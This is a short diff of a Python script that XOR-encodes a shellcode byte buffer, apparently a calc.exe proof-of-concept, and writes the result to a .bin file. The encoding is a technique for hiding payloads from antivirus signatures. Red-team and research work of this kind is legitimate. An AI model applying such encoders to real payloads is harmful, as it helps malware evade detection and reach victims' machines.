@@ -37,15 +37,16 @@ buf += b"\x61\x6c\x63\x2e\x65\x78\x65\x00"
 
 def xor_shift(data, shift):
     """Applies a bitwise XOR operation with a shift to the data."""
-    return bytes((b + shift) % 256 for b in data)
+    return bytes(b ^shift for b in data)
 
 if(__name__ == "__main__"):
     print("XOR Shift Shellcode Encryption")
-    xor_shifted_shellcode = xor_shift(buf, 15)
-    with open('shell_temp.bin', 'wb') as f:
+    xor_shifted_shellcode = xor_shift(buf, 0x0F)
+    print(xor_shifted_shellcode)
+
+    with open('shell_sum.bin', 'wb') as f:
         f.write(xor_shifted_shellcode)
-    
-    
+
     # with open('shell_org.bin',"rb") as f:
     #     shell_org = f.read()
     #     print(shell_org)
